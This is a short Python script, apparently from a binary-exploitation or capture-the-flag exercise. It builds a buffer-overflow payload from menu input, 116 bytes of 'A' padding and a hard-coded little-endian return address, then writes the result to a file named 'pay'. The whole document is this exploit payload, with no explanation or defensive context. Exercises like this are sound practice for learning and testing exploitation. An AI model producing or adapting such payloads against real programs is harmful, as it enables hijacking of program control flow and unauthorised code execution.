ret = b"\x9f\x0c\x40\x55\x55\x55\x00\x00"
pay = b"2\naa\n" + b"A" * 116 +  ret + b"\n"
with open("pay", "wb") as f:
    f.write(pay)


